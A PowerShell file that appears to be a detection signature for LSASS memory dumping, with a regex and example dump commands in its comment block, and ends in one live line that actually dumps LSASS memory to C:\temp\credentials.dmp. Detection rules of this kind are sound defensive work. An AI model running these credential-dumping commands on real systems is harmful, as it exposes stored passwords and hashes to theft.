<#
.SYNOPSIS
LSASS memory dump detection signature

.DESCRIPTION
Detects attempts to dump LSASS process memory using PowerShell, commonly used by attackers to extract credentials from memory. This technique is frequently seen in post-exploitation scenarios.

.SEVERITY
critical

.CATEGORY
credential-theft

.SCORE
95

.REGEX
Get-Process\s+lsass|Out-Minidump.*lsass|MiniDumpWriteDump.*lsass|rundll32.*comsvcs.*MiniDump

.EXAMPLES
Get-Process lsass | Out-Minidump -DumpFilePath C:\temp\lsass.dmp
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id dump.bin full
powershell -c "Get-Process lsass | Out-Minidump"
#>

# Advanced LSASS memory dumping technique
Get-Process lsass | Out-Minidump -DumpFilePath C:\temp\credentials.dmp
